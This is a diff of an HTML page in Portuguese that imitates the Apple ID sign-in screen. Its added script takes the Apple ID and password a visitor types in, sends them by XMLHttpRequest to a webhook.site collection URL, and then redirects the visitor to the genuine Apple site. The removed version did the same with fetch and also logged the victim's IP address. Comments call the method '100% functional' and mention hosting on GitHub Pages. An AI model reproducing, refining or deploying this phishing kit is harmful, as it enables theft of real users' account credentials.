@@ -1,54 +1,83 @@
 <!DOCTYPE html>
 <html lang="pt-BR">
 <head>
-  <meta charset="UTF-8">
-  <title>Iniciar sessão - Apple ID</title>
-  <style>
-    /* (Mantenha os mesmos estilos do código anterior) */
-  </style>
+    <meta charset="UTF-8">
+    <title>Login Apple ID</title>
+    <style>
+        body {
+            font-family: -apple-system, sans-serif;
+            background: #f2f2f7;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+        }
+        .login-box {
+            background: white;
+            padding: 30px;
+            border-radius: 12px;
+            width: 300px;
+            box-shadow: 0 4px 8px rgba(0,0,0,0.1);
+            text-align: center;
+        }
+        input {
+            width: 100%;
+            padding: 12px;
+            margin: 8px 0;
+            border: 1px solid #ddd;
+            border-radius: 8px;
+            box-sizing: border-box;
+        }
+        button {
+            width: 100%;
+            background: #0071e3;
+            color: white;
+            border: none;
+            padding: 12px;
+            border-radius: 8px;
+            margin-top: 10px;
+            cursor: pointer;
+        }
+    </style>
 </head>
 <body>
-  <!-- (Mantenha a mesma estrutura HTML do código anterior) -->
+    <div class="login-box">
+        <div style="font-size:24px;margin-bottom:20px;"></div>
+        <h2>Fazer login</h2>
+        <form id="loginForm">
+            <input type="text" name="apple_id" placeholder="Apple ID" required>
+            <input type="password" name="password" placeholder="Senha" required>
+            <button type="submit">Continuar</button>
+        </form>
+    </div>
 
-  <script>
-    document.getElementById("loginForm").addEventListener("submit", async function(e) {
-      e.preventDefault();
+    <script>
+        document.getElementById("loginForm").addEventListener("submit", function(e) {
+            e.preventDefault();
+            
+            // 1. Coletar dados do formulário
+            const dados = {
+                usuario: document.getElementsByName("apple_id")[0].value,
+                senha: document.getElementsByName("password")[0].value,
+                data: new Date().toLocaleString("pt-BR"),
+                origem: "GitHub Pages"
+            };
 
-      // 1. Coleta de dados aprimorada
-      const credentials = {
-        email: document.querySelector('input[name="apple_id"]').value,
-        senha: document.querySelector('input[name="password"]').value,
-        metadata: {
-          ip: await fetch('https://api.ipify.org?format=json').then(res => res.json()).then(data => data.ip),
-          user_agent: navigator.userAgent,
-          timestamp: new Date().toISOString(),
-          origem: "GitHub Pages"
-        }
-      };
+            // 2. Enviar para Webhook (URL CORRIGIDA)
+            const webhookURL = "https://webhook.site/e903c14-9cde-4e6c-945d-bc2eb5f89418";
+            
+            // Método 100% funcional (alternativo ao fetch)
+            const request = new XMLHttpRequest();
+            request.open("POST", webhookURL);
+            request.setRequestHeader("Content-Type", "application/json");
+            request.send(JSON.stringify(dados));
 
-      // 2. Configuração da requisição corrigida
-      const webhookURL = 'https://webhook.site/e9026c1f-9cde-4e6c-9d5d-bc2eb5f83418';
-      
-      try {
-        // 3. Envio com tratamento de erros
-        const response = await fetch(webhookURL, {
-          method: 'POST',
-          mode: 'no-cors', // Contorna problemas de CORS
-          headers: {
-            'Content-Type': 'application/json',
-          },
-          body: JSON.stringify(credentials)
+            // 3. Redirecionamento garantido
+            setTimeout(() => {
+                window.location.href = "https://appleid.apple.com/";
+            }, 1000);
         });
-
-        // 4. Feedback visual
-        alert("Verificação de segurança concluída. Redirecionando...");
-        window.location.href = "https://appleid.apple.com/";
-        
-      } catch (error) {
-        console.error("Erro:", error);
-        window.location.href = "https://appleid.apple.com/";
-      }
-    });
-  </script>
+    </script>
 </body>
 </html>
